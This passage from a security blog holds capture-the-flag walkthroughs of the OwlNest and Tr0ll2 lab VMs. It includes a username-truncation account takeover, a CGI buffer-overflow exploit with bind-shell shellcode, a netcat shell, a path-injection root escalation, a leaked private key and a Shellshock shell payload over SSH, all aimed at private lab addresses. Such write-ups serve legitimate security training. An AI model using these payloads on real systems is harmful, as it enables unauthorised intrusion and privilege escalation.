Could we cheat the system and register a user with the name "admin" and then add 11 spaces after it plus a random character ? We can assume that the registration form will truncate any characters over 16. Tamper data is our friend here - the form can be filled in with the username of "admin" and then intercepted with Tamper data (or Burp, if you want) to modify the username POST variable to "admin           a" and submitted.

[![owlnest_003](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_003.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_003.png)

[![owlnest_004](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_004.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_004.png)

[![owlnest_005](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_005.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_005.png)

Once this malicious user is created, it is possible to then log in with the username of "admin" and the password we set for "admin           a".

[![owlnest_006](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_006.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_006.png)

Which allows access to the Upload feature (not that we're going to use it for it's intended use)

[![owlnest_007](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_007.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_007.png)

* * *

## This is a Hoot !

The upload form posts to /application/upload
</code></pre>

<p><form class="form-horizontal" method="POST" enctype="multipart/form-data" action="/application/upload">
&#8220;`</p>

<p>Which when called with no arguments shows the following</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_008.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_008.png" alt="owlnest_008" /></a></p>

<p>It is possible to browse to the application folder, which shows that the application is actually 601kb - a bit much just to parse an upload form.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_009.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_009.png" alt="owlnest_009" /></a></p>

<h2>Owls Well That Ends Well</h2>

<p>The uploadform.php page can be used to provide us with a base64 encoded copy of the upload binary, which means it will not be parsed or executed.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/owlnest_010.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/owlnest_010.png" alt="owlnest_010" /></a></p>

<p>With the binary now available offline, we can go about working out what it does. It&rsquo;s a CGI binary, so we can interact with it via the command line using the QUERY_STRING environment value. Lets set something really simple first. I&rsquo;ve purposefully not included any GDB stuff here, as an excuse for you to work it out and learn :)</p>

<pre><code class="bash">root@pwk:~# export QUERY_STRING="name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=me@me.com"
root@pwk:~# ./owlbin
Content-type: text/plain

Unable to open file
root@pwk:~#
</code></pre>

<p>It is possible to overflow this application via the email variable, which through some further investigation identifies that EIP is at offset 277.</p>

<pre><code class="bash">root@pwk:~# export QUERY_STRING=$(python -c 'print "uploadfield=/etc/passwd&amp;uploadfield=bleh99&amp;name=Me&amp;email=AAH@" + "A"*276+"BBBB"')
root@pwk:~# ./owlbin
Content-type: text/plain

Segmentation fault
root@pwk:~#
</code></pre>

<p>gdb-peda can be used to find a jmp esp call, which is at 0x80c75ab9. This is what we&rsquo;ll set our EIP value to, which should hopefully jump to our bind shell shellcode. This can be completely exploited as follows</p>

<pre><code class="bash">root@pwk:~# export QUERY_STRING=$(python -c 'print "uploadfield=/etc/passwd&amp;uploadfield=passwd&amp;name=Russ&amp;email=AAH@" + "A"*276+"\xab\x75\x0c\x08" + "\x90\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"')
root@pwk:~# curl -v "http://172.16.56.140/application/upload" --data "$QUERY_STRING"
* About to connect() to 172.16.56.140 port 80 (#0)
*   Trying 172.16.56.140...
* connected
* Connected to 172.16.56.140 (172.16.56.140) port 80 (#0)
&gt; POST /application/upload HTTP/1.1
&gt; User-Agent: curl/7.26.0
&gt; Host: 172.16.56.140
&gt; Accept: */*
&gt; Content-Length: 436
&gt; Content-Type: application/x-www-form-urlencoded
&gt;
* upload completely sent off: 436 out of 436 bytes
root@pwk:~# nc -nv 172.16.56.140 1337
nc: 172.16.56.140 1337 open
id
uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
</code></pre>

<p>Once a public key is added to authorized_hosts, we can SSH in and obtain a full TTY shell.</p>

<pre><code class="bash">$ ssh rmp@172.16.56.131
The authenticity of host '172.16.56.131 (172.16.56.131)' can't be established.
RSA key fingerprint is c0:f8:4e:c6:f9:28:14:5b:c3:ed:8a:00:51:aa:82:d5.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.56.131' (RSA) to the list of known hosts.
Linux owlnest 3.2.0-4-686-pae #1 SMP Debian 3.2.60-1+deb7u3 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
rmp@owlnest:~$ id
uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
rmp@owlnest:~$
</code></pre>

<p>There&rsquo;s one application available in /home/rmp, and that&rsquo;s the application that is listening on port 31337 (the one that requested username and password etc).</p>

<pre><code class="bash">rmp@owlnest:~$ ls -l
total 588
-rwx------ 1 rmp rmp 599275 Aug 11 13:35 adminconsole
rmp@owlnest:~$
</code></pre>

<p>which when straced, shows that it is reading /root/password.txt to check the provided credentials.</p>

<pre><code class="bash">root@pwk:~# strace ./adminconsole
execve("./adminconsole", ["./adminconsole"], [/* 19 vars */]) = 0
uname({sys="Linux", node="pwk", ...})   = 0
brk(0)                                  = 0x9407000
brk(0x9407cd0)                          = 0x9407cd0
set_thread_area({entry_number:-1 -&gt; 6, base_addr:0x9407830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
brk(0x9428cd0)                          = 0x9428cd0
brk(0x9429000)                          = 0x9429000
fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775e000
write(1, "        (\\___/)   (\\___/)   (\\__"..., 67        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
) = 67
write(1, "        /0\\ /0\\   /o\\ /o\\   /0\\ "..., 67        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
) = 67
write(1, "        \\__V__/   \\__V__/   \\__V"..., 67        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
) = 67
write(1, "       /|:. .:|\\ /|;, ,;|\\ /|:. "..., 68       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
) = 68
write(1, "       \\\\:::::// \\\\;;;;;// \\\\:::"..., 68       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
) = 68
write(1, "   -----`\"\" \"\"`---`\"\" \"\"`---`\"\" "..., 70   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
) = 70
write(1, "        \\__V__/   \\__V__/   \\__V"..., 69        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

) = 69
write(1, "This is the OwlNest Administrati"..., 46This is the OwlNest Administration console

) = 46
write(1, "Type Help for a list of availabl"..., 47Type Help for a list of available commands.

) = 47
write(1, "Ready: ", 7Ready: )                  = 7
fstat64(0, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775d000
read(0, username root
"username root\n", 1024)        = 14
write(1, "Ready: ", 7Ready: )                  = 7
read(0, privs AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
"privs AAAAAAAAAAAAAAAAAAAAAAAAAA"..., 1024) = 96
write(1, "Ready: ", 7Ready: )                  = 7
read(0, password hello
"password hello\n", 1024)       = 15
open("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ", O_RDONLY) = -1 ENOENT (No such file or directory)
open("/root/password.txt", O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775c000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
_llseek(3, 0, [0], SEEK_SET)            = 0
read(3, "cunt\n", 5)                    = 5
_llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb775c000, 4096)                = 0
write(1, "Ready: ", 7Ready: )                  = 7
read(0, ^C &lt;unfinished ...&gt;
root@pwk:~# 
</code></pre>

<p>However, by pure chance, in this particular attempt, I tried to overflow the privs command, and as you can see, it seems the application is attempting to open AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA before the password file. Can we use this to make the application open a file containing a password we control ? Yes, yes we can&hellip;</p>

<pre><code class="bash">root@pwk:~# strace ./adminconsole
execve("./adminconsole", ["./adminconsole"], [/* 19 vars */]) = 0
uname({sys="Linux", node="pwk", ...})   = 0
brk(0)                                  = 0x84b0000
brk(0x84b0cd0)                          = 0x84b0cd0
set_thread_area({entry_number:-1 -&gt; 6, base_addr:0x84b0830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
brk(0x84d1cd0)                          = 0x84d1cd0
brk(0x84d2000)                          = 0x84d2000
fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7717000
write(1, "        (\\___/)   (\\___/)   (\\__"..., 67        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
) = 67
write(1, "        /0\\ /0\\   /o\\ /o\\   /0\\ "..., 67        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
) = 67
write(1, "        \\__V__/   \\__V__/   \\__V"..., 67        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
) = 67
write(1, "       /|:. .:|\\ /|;, ,;|\\ /|:. "..., 68       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
) = 68
write(1, "       \\\\:::::// \\\\;;;;;// \\\\:::"..., 68       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
) = 68
write(1, "   -----`\"\" \"\"`---`\"\" \"\"`---`\"\" "..., 70   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
) = 70
write(1, "        \\__V__/   \\__V__/   \\__V"..., 69        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

) = 69
write(1, "This is the OwlNest Administrati"..., 46This is the OwlNest Administration console

) = 46
write(1, "Type Help for a list of availabl"..., 47Type Help for a list of available commands.

) = 47
write(1, "Ready: ", 7Ready: )                  = 7
fstat64(0, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7716000
read(0, username root
"username root\n", 1024)        = 14
write(1, "Ready: ", 7Ready: )                  = 7
read(0, privs /home/meh/password.txt
"privs /home/meh/password.txt\n", 1024) = 29
write(1, "Ready: ", 7Ready: )                  = 7
read(0, password arse
"password arse\n", 1024)        = 14
open("rd.txt", O_RDONLY)                = -1 ENOENT (No such file or directory)
open("/root/password.txt", O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7715000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
_llseek(3, 0, [0], SEEK_SET)            = 0
read(3, "blah\n", 5)                    = 5
_llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb7715000, 4096)                = 0
</code></pre>

<p>As you can see here, it&rsquo;s cut off the first 16 characters of our priv input, and is trying to open &ldquo;rd.txt&rdquo;, which doesn&rsquo;t exist. Therefore we have to pad the privs input by 16 characters.</p>

<pre><code class="bash">write(1, "Ready: ", 7Ready: )                  = 7
read(0, username root
"username root\n", 1024)        = 14
write(1, "Ready: ", 7Ready: )                  = 7
read(0, privs AAAAAAAAAAAAAAAA/home/meh/password.txt
"privs AAAAAAAAAAAAAAAA/home/meh/"..., 1024) = 45
write(1, "Ready: ", 7Ready: )                  = 7
read(0, password bleh
"password bleh\n", 1024)        = 14
open("/home/meh/password.txt", O_RDONLY) = -1 ENOENT (No such file or directory)
open("/root/password.txt", O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7715000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
_llseek(3, 0, [0], SEEK_SET)            = 0
read(3, "cunt\n", 5)                    = 5
_llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb7715000, 4096)                = 0
write(1, "Ready: ", 7Ready: )                  = 7
read(0,
</code></pre>

<p>So, all we need to do now, is write a file to /home/rmp containing a password, and make the application read it instead of /root/password.txt.</p>

<pre><code class="bash">root@pwk:~# nc 172.16.56.140 31337
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: username root
Ready: privs AAAAAAAAAAAAAAAA/home/rmp/password.txt
Ready: password password
Ready: login
Access Granted!
Dropping into /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
               \ `-._......_.-` /
                `.  '.    .'  .'    Oh Well, in the end you did it!
                 //  _`\/`_  \\     You stopped the olws' evil plan
                ||  /\O||O/\  ||    By pwning their secret base you
                |\  \_/||\_/  /|    saved the world!
                \ '.   \/   .' /
                / ^ `'~  ~'`   \
               /  _-^_~ -^_ ~-  |
               | / ^_ -^_- ~_^\ |
               | |~_ ^- _-^_ -| |
               | \  ^-~_ ~-_^ / |
               \_/;-.,____,.-;\_/
        ==========(_(_(==)_)_)=========

The flag is: ea2e548590260e12030c2460f82c1cff8965cff1971107a9ecb3565b08c274f4

Hope you enjoyed this vulnerable VM.
Looking forward to see a writeup from you soon!
don't forget to ping me on twitter with your thoughts

Sincerely
@Swappage

PS: why the owls? oh well, I really don't know and yes: i really suck at fictioning :p
True story is that i was looking for some ASCII art to place in the puzzles and owls popped out first
</code></pre>

<p><img src="http://media.tumblr.com/69d8d838b215ce8aeb5bcee2cac8c67a/tumblr_inline_n6f627Eb3o1rv1fhg.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Please do not feed the trolls.]]></title>
    <link href="http://recrudesce.github.io/2014/10/26/please-do-not-feed-the-trolls/"/>
    <updated>2014-10-26T14:36:45+00:00</updated>
    <id>http://recrudesce.github.io/2014/10/26/please-do-not-feed-the-trolls</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/Maleus21">Maleus</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> a while ago, and while I didn&rsquo;t attempt it, I figured I&rsquo;d do the follow up - <a href="http://vulnhub.com/entry/tr0ll-2,107/">Tr0ll2</a>. So, here is a quick runthrough of how to pwn it.</p>

<p>I would put this VM at beginner level - it&rsquo;s not particularly complicated. It&rsquo;s more a case of finding hidden data than actually doing any vulnerability exploitation. Lets get started.</p>

<!-- more -->


<p><img src="http://www.zerodayclothing.com/products/designs/trinity_design.png" alt="" /></p>

<p>And so should you.</p>

<pre><code class="bash">root@pwk:~# nmap -sS -T5 -p- --script banner 172.16.56.138

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-23 15:27 BST
Nmap scan report for 172.16.56.138
Host is up (0.00020s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
|_banner: 220 Welcome to Tr0ll FTP... Only noobs stay for a while...
22/tcp open  ssh
|_banner: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4
80/tcp open  http
MAC Address: 00:0C:29:14:2B:52 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds
root@pwk:~#
</code></pre>

<p>FTP, SSH and HTTP. Lets hit the HTTP server first, as that&rsquo;s where Tr0ll started.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_001.png" alt="tr0ll2_001" /></a></p>

<p>So, the usual then. A quick Nikto scan shows that there&rsquo;s a robots.txt file, which has the following in it</p>

<pre><code class="text">User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
</code></pre>

<p>Using this as a wordlist for dirb shows that only 4 of these directories actually result in an HTTP response other than 404.</p>

<pre><code class="bash">root@pwk:~# dirb http://172.16.56.138 troll_url.txt 

-----------------
DIRB v2.21
By The Dark Raver
-----------------

START_TIME: Thu Oct 23 15:31:32 2014
URL_BASE: http://172.16.56.138/
WORDLIST_FILES: troll_url.txt

-----------------

GENERATED WORDS: 21                                                            

---- Scanning URL: http://172.16.56.138/ ----
==&gt; DIRECTORY: http://172.16.56.138/noob/
==&gt; DIRECTORY: http://172.16.56.138/keep_trying/
==&gt; DIRECTORY: http://172.16.56.138/dont_bother/
==&gt; DIRECTORY: http://172.16.56.138/ok_this_is_it/                                                                                                      

---- Entering directory: http://172.16.56.138/noob/ ----

---- Entering directory: http://172.16.56.138/keep_trying/ ----

---- Entering directory: http://172.16.56.138/dont_bother/ ----

---- Entering directory: http://172.16.56.138/ok_this_is_it/ ----

-----------------
DOWNLOADED: 105 - FOUND: 0
root@pwk:~/troll#
</code></pre>

<p>Visiting these URL&rsquo;s provide the following page
<a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_002.png" alt="tr0ll2_002" /></a></p>

<p>While it looks like the page is identical for each of the 4 directories, on closer inspection, one of the images shown is slightly larger than the rest - this was determined by downloading each image.</p>

<pre><code class="bash">-rw-r--r-- 1 root root   15831 Oct  4 09:57 cat_the_troll.jpg
-rw-r--r-- 1 root root   15873 Oct  4 09:31 cat_the_troll.jpg.1
</code></pre>

<p>Running strings (NOOOO !!!!) on this file results in the following output</p>

<pre><code class="bash">Look Deep within y0ur_self for the answer
root@pwk:~#
</code></pre>

<p>Which just so happens to be a folder on the webserver, containing an answer.txt file. Short story shorter, answer.txt is just a dictionary file but with each individual line base64 encoded.
On visual inspection, one line stands out&hellip; (yes, I could probably have written something, but scrolling through a large file and noticing strange anomalies is my bag, ok ?)</p>

<pre><code class="text">SXNzYWNoYXIK
SXN0YW5idWwK
SXN0YW5idWwK
SXN1enUK
SXN1enUK
SXQK
SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg==
SXRhaXB1Cg==
SXRhaXB1Cg==
SXRhbGlhbgo=
SXRhbGlhbgo=
SXRhbGlhbnMK
SXRhbHkK
</code></pre>

<p>Decoded, we get</p>

<pre><code class="bash">root@pwk:~# echo SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg== | base64 -d
ItCantReallyBeThisEasyRightLOL
</code></pre>

<p><img src="http://i780.photobucket.com/albums/yy82/dguy210/facepalm-star-trek-o_zps1270c857.gif" alt="" /></p>

<p>So, we&rsquo;ve exhausted the HTTP server by this point, so lets move onto FTP. I won&rsquo;t bore you with details, but the username and password combo is Tr0ll:Tr0ll. The only file residing on the FTP server is a ZIP file.</p>

<pre><code class="bash">root@pwk:~# ftp 172.16.56.138
Connected to 172.16.56.138.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (172.16.56.138:root): Tr0ll
331 Please specify the password.
Password: Tr0ll
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -l
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
226 Directory send OK.
ftp&gt;
</code></pre>

<p>On extracting the ZIP file, we are asked for a password&hellip; lets try &ldquo;ItCantReallyBeThisEasyRightLOL&rdquo;</p>

<pre><code class="bash">root@pwk:~# unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password: ItCantReallyBeThisEasyRightLOL
  inflating: noob
</code></pre>

<p>which turns out to be an RSA private key - this is our route in via SSH.</p>

<pre><code class="text">-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
</code></pre>

<p>It is possible to SSH into the VM using the noob user, as per the key&rsquo;s filename, but we are immediately disconnected.</p>

<pre><code class="bash">root@pwk:~# ssh -i key.key noob@172.16.56.138
TRY HARDER LOL!
Connection to 172.16.56.138 closed.
root@pwk:~#
</code></pre>

<p>Standard things here like &ndash;norc don&rsquo;t work, so lets try something new. SHELLSHOCK !</p>

<pre><code class="bash">root@pwk:~# ssh -i key.key noob@172.16.56.138 '() { :;}; cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
maleus:x:1000:1000:Tr0ll,,,:/home/maleus:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:104:111:ftp daemon,,,:/srv/ftp:/bin/false
noob:x:1002:1002::/home/noob:/bin/bash
Tr0ll:x:1001:1001::/home/tr0ll:/bin/false
root@pwk:~#
</code></pre>

<p>Yup, we can get a shell with this using &lsquo;() { :;}; /bin/bash&rsquo;</p>

<pre><code class="bash">root@pwk:~# ssh -i key.key noob@172.16.56.138 '() { :;}; /bin/bash'
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
</code></pre>

<p>A small bit of enumeration here identifies the following folder structure</p>

<pre><code class="bash">pwd
/nothing_to_see_here/choose_wisely
ls -l
total 12
drwsr-xr-x 2 root root 4096 Oct  5 21:16 door1
drwsr-xr-x 2 root root 4096 Oct  5 21:19 door2
drwsr-xr-x 2 root root 4096 Oct  5 21:17 door3
</code></pre>

<p>Each door folder includes a file called r00t, which is a binary. However, there are 3 different versions. One of them puts you into an rbash shell for 2 minutes, one of them kicks you out and reboots the VM, and the other one (the largest one) repeats anything you provide it via stdin. These files are SUID, so, looks like we have a standard buffer overflow here.</p>

<pre><code class="bash">-rwsr-xr-x 1 root root 7273 Oct  5 21:16 r00t
-rwsr-xr-x 1 root root 8401 Oct  5 21:16 r00t
-rwsr-xr-x 1 root root 7271 Oct  5 21:17 r00t
</code></pre>

<p>Something to note here before we carry on - a scheduled script rotates these files, so make sure you always work on the file that is 8401 bytes large - you may have to change into a different door directory.</p>

<p>Loading the file in GDB shows that you can easily overflow it with about 300 bytes of input.</p>

<pre><code class="bash">root@pwk:~# gdb ./r00t
GNU gdb (GDB) 7.4.1-debian
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
Reading symbols from /root/troll/r00t...done.
gdb-peda$ r $(python -c 'print "A"*300');

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x12c
